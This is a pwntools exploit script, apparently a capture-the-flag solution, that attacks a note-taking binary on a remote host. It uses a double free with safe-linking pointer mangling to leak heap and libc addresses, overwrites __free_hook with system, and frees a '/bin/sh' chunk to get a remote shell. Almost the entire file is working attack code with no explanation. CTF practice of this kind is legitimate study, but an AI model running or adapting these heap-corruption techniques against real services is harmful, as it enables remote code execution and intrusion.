#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 128.199.155.5 --port 5006 ./yournote
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./yournote_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '128.199.155.5'
port = int(args.PORT or 5006)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def add(idx,size,content):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(size))
    io.sendlineafter(": ",content)
    
def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter(": ",str(idx))

def view(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(idx))

libc = ELF("./libc.so.6")

for i in range(9): # 0 - 8
    add(i,0x20,"JUNK")

for i in range(9): # 9 - 18
    add(9+i,0x30,"JUNK")

for i in range(7): # 0 - 6 
    delete(i)

for i in range(7): # 9 - 15
    delete(9+i)

delete(7)
delete(8)
delete(7)
delete(8)

view(0)
base_heap = u64(io.recvuntil("[1]",drop=True)[:-1].ljust(8,"\x00")) << 12
print hex(base_heap)

for i in range(7):
    add(i,0x20,"JUNK")

add(0x20,0x20,p64(0x4041b0 ^ base_heap >> 12))
add(0x21,0x20,"JUNK")
add(0x21,0x20,"JUNK")
add(0x20,0x20,p64(exe.got['free']))

view(0x20-2)

libc.address = u64(io.recvline()[:-1].ljust(8,"\x00")) - libc.sym['free'] 
print hex(libc.address)

delete(16)
delete(17)
delete(16)
delete(17)

for i in range(7):
    add(i,0x30,"JUNK")

add(0x20,0x30,p64(libc.sym['__free_hook'] ^ base_heap >> 12))
add(0x21,0x30,"/bin/sh\x00")
add(0x21,0x30,"/bin/sh\x00")
add(0x20,0x30,p64(libc.sym['system']))

delete(0x21)

io.interactive()

